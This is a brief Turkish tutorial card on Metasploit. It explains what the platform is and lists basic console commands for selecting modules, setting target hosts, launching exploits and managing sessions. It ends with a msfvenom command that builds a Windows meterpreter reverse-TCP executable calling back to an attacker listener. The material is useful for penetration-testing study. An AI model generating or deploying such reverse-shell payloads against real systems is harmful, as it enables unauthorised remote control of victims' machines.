Metasploit Nedir?

Metasploit, sistemlerin zafiyetlerini test etmek, güvenlik açıklarını doğrulamak ve sızma testleri gerçekleştirmek için kullanılan modüler bir güvenlik platformudur.

02

Temel Konsol Komutları

search  : Zafiyet veya modül arar
use    : Belirtilen modülü aktif eder
show options   : Modül parametrelerini gösterir
set RHOSTS IP  : Hedef IP adresini belirler
exploit / run  : Saldırı modülünü başlatır
sessions -l    : Aktif oturumları listeler
sessions -i ID : Belirtilen oturuma bağlanır
03

Msfvenom Payload Üretimi

msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.15 LPORT=4444 -f exe > payload.exe
